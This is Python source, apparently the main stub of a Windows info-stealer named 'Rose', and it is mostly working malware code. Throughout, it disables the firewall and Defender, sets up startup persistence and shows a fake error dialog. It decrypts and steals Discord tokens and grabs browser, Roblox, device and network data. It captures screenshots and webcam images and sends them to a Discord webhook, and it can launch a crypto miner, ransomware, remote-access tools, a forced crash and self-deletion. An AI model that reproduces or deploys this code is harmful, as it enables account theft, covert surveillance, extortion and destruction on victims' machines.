if IsAdmin():
    dir_name = 'rose'
    roaming = os.getenv('APPDATA')
    working_dir = os.path.join(roaming, dir_name)
    startup_loc = os.path.join(roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    if cc.get_disable_protectors():
        subprocess.run('netsh advfirewall set domainprofile state off', shell=True)
        subprocess.run(
            'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1',
            shell=True)
        subprocess.run("powershell -Command \"Add-MpPreference -ExclusionPath '{}','{}'\"".format(working_dir, startup_loc),
                       shell=True)
        subprocess.run('powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"', shell=True)
    if cc.get_block_sites():
        block_sites()

if cc.get_start_up():
    try:
        Startup()
    except Exception as e:
        send_error_notification(e, 'Rose Startup')

if not os.path.exists(main_path):
    try:
        os.mkdir(main_path)
    except Exception as e:
        pass

if cc.get_fake_error():
    try:
        ctypes.windll.user32.MessageBoxW(0, 'This application failed to start because d3dx9_43.dll was not found. Re-installing the application may fix this problem.', f"{os.path.basename(__file__)} - System Error", 16)
    except Exception as e:
        send_error_notification(e, 'Rose Fake Error')

if cc.get_discord_ping():
    try:
        webx = _WebhookX().get_object()
        webx.send('@everyone')
    except Exception as e:
        send_error_notification(e, 'Rose Ping')

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
    if starts in ("v10", "v11"):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def CryptUnprotectData2(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None,
                                         byref(blob_entropy), None, None, 0x01,
                                         byref(blob_out)):
        return GetData(blob_out)

Tokens = ""
dclass = DiscordX()

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"):
        return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData2(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{pathC}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for token in re.findall(
                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(
                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
                    if dclass.checkToken(
                            tokenDecoded) and tokenDecoded not in Tokens:
                        Tokens += tokenDecoded
                        dclass.uploadToken(tokenDecoded)

def GetTokens(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{path}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for regex in (
                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                        r"mfa\.[\w-]{80,95}",
                ):
                    for token in re.findall(regex, line):
                        global Tokens
                        if dclass.checkToken(token) and token not in Tokens:
                            Tokens += token
                            dclass.uploadToken(token)

discordPaths = [
    [f"{roaming}/Discord", "/Local Storage/leveldb"],
    [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
    [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
    [f"{roaming}/discordptb", "/Local Storage/leveldb"],
]

if cc.get_token_stealing():
    for patt in discordPaths:
            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
            a.start()
            Threadlist.append(a)

if cc.get_browser_stealing():
    try:
        browsers = Browsers(webhook)
    except Exception as e:
        send_error_notification(e, 'Rose Browser Stealer')

if cc.get_screenshot():
    try:
        rndm_strr = get_random_string(5)
        path = os.path.join(main_path, f"screenshot_{rndm_strr}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(path)
        
        webx = _WebhookX().get_object()

        embed = Embed(
            title='Rose Report',
            description='Rose Instance - Screenshot',
            color=eb_color,
            timestamp=datetime.now().isoformat()
        )

        embed.set_author(name=wh_name, icon_url=wh_avatar)
        embed.set_footer(text=eb_footer, icon_url=wh_avatar)

        file = File(path, name='screenshot.png')

        embed.set_image(url=f"attachment://screenshot.png")
        
        webx.send(embed=embed, file=file)
        
        os.remove(path)
    except Exception as e:
        send_error_notification(e, 'Rose Screenshot Stealer')
    
if cc.get_webcam():
    pygame.camera.init()

    camlist = pygame.camera.list_cameras()

    try:
        rndm_strr = get_random_string(5)
        if camlist:
            cam = pygame.camera.Camera(camlist[0], (640, 480))
            cam.start()
            image = cam.get_image()
            path = os.path.join(main_path, f"webcam_{rndm_strr}.png")
            pygame.image.save(image, path)
            cam.stop()
            webx = _WebhookX().get_object()

            embed = Embed(
                title='Rose Report',
                description='Rose Instance - Webcam',
                color=eb_color,
                timestamp=datetime.now().isoformat()
            )

            embed.set_author(name=wh_name, icon_url=wh_avatar)
            embed.set_footer(text=eb_footer, icon_url=wh_avatar)

            file = File(path, name='webcam.png')

            embed.set_image(url=f"attachment://webcam.png")
        
            webx.send(embed=embed, file=file)

            os.remove(path)
    except Exception as e:
        send_error_notification(e, 'Rose Webcam Stealer')

if cc.get_games():
    try:
        get_games().get_games()
    except Exception as e:
        send_error_notification(e, 'Rose Games and Application Grabber')

if cc.get_deviceinf_stealing():
    try:
        send_device_information()
    except Exception as e:
        send_error_notification(e, 'Rose Device Data Stealing')

if cc.get_ipinf_stealing():
    try:
        ifx.send_data()
    except Exception as e:
        send_error_notification(e, 'Rose IP & Wi-Fi Data')

if cc.get_injection():
    try:
        InjectionX(webhook)
    except Exception as e:
        send_error_notification(e, 'Rose Discord Injection')

if cc.get_roblox_stealing():
    try:
        RobloxX().run()
    except Exception as e:
        send_error_notification(e, 'Rose Roblox Stealer')

if os.path.exists(main_path):
    try:
        shutil.rmtree(main_path)
    except Exception as e:
        pass

if cc.get_xmr_miner():
    try:
        threading.Thread(target=xmrig()).start()
    except Exception as e:
        send_error_notification(e, 'XMR Miner')

if cc.get_ransomware():
    try:
        threading.Thread(target=ransomware.ransomware()).start()
    except Exception as e:
        send_error_notification(e, 'Rose Ransomware')

if cc.get_knight_discord_rat():
    try:
        threading.Thread(target=run_knight_rat()).start()
    except Exception as e:
        send_error_notification(e, 'Knight Remote Access')

if cc.get_rose_discord_rat():
    try:
        threading.Thread(target=run_rose_rat()).start()
    except Exception as e:
        send_error_notification(e, 'Rose Remote Access')

if cc.get_tsbsod():
    try:
        if not os.path.dirname(os.path.realpath(__file__)) == os.path.join(os.getenv('APPDATA'), 'rose'):
            Trigger()
    except Exception as e:
        send_error_notification(e, 'Rose Trigger BSOD')

if cc.get_rose_melt_stub():
    try:
        if not (cc.get_knight_discord_rat() or cc.get_rose_discord_rat() or cc.get_ransomware()):
        
            path = sys.argv[0]

            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

            sys.exit()
    except Exception as e:
        send_error_notification(e, 'Rose Anti Debug')
